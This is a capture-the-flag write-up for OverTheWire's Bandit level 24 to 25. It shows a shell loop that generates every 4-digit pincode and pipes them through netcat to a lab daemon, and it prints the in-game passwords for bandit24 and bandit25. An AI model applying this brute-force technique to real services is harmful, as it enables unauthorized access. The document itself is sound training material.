# Level 24 → Level 25

## Level Goal
A daemon is listening on `port 30002` and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode.  
There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

## Solution

Connect to the challenge through SSH:

```sh
~$ ssh bandit24@bandit.labs.overthewire.org -p 2220 # password: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
```

Generate a dictionary (in `/tmp/bandit24-brute-force.dic`) of all permittation we will send to the server:

```sh
bandit24@bandit:~$ CURRENT_PASSWORD=`cat /etc/bandit_pass/bandit24`
bandit24@bandit:~$ for i in {0000..9999}; do echo $CURRENT_PASSWORD $i >> /tmp/bandit24-brute-force.dic; done
```

Send all dictionary entries, to the server:

```sh
bandit24@bandit:~$ cat /tmp/bandit24-brute-force.dic | nc localhost 30002
# <truncated>
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d

Exiting.
```

## Resources

Challenge: https://overthewire.org/wargames/bandit/bandit25.html